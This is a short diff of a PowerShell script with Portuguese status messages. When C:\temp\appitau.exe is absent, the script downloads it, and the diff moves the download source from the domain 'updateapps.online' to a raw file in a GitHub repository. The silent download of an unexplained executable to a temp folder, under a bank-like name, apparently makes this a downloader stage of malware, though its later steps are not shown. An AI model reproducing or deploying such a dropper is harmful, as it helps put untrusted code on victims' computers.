@@ -13,7 +13,7 @@ if (Test-Path -Path "C:\temp\appitau.exe") {
 Write-Host "APP jÃ¡ existe!"
 } ELSE {
 Write-Host "Baixando APP"
-Invoke-WebRequest -Uri "https://updateapps.online/appit" -OutFile "C:\temp\appitau.exe"
+Invoke-WebRequest -Uri "https://github.com/insidemail/appi/raw/refs/heads/main/appit" -OutFile "C:\temp\appitau.exe"
 }
 
 if (Test-Path -Path "C:\temp\appitau.exe") {
